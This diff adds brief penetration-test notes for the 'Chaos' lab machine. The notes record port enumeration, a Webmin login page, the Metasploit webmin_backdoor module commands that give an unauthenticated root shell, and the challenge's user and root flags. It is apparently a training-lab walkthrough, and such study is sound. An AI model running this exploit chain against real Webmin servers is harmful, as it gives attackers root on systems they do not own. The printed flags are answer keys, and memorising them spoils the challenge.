@@ -1,0 +1,36 @@
+Chaos   10.10.10.120
+ttl 63 > Linux
+
+[+]Enumeration
+
+   5   │ PORT      STATE SERVICE  VERSION
+   6   │ 80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
+   7   │ |_http-title: Site doesn't have a title (text/html).
+   8   │ |_http-server-header: Apache/2.4.34 (Ubuntu)
+
+  37   │ 10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
+  38   │ |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+  39   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  
+  
+  [+]Fuzzing
+  https://10.10.10.120:10000/ > login >> webmin
+  
+  
+  [+]Exploit 
+  Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)
+  https://www.exploit-db.com/exploits/47230
+  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+  
+  msfconsole > use exploit/linux/http/webmin_backdoor 
+  set SSL true
+  exploit
+  
+  whoami
+  root
+  
+  cat /home/ayush/user.txt
+  eef39126d9c3b4b8a30286970dc713e1
+  
+  cat /root/root.txt
+  4eca7e09e3520e020884563cfbabbc70
